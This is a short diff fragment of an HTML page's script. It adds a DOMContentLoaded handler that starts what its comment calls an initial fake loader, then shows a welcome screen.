+                showScreen('welcomeScreen'); 
+            }, 0); 
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Start the initial fake loader
+            startInitialLoader();
+        });
+    </script>
 </body>
-</html>
+                              </html>
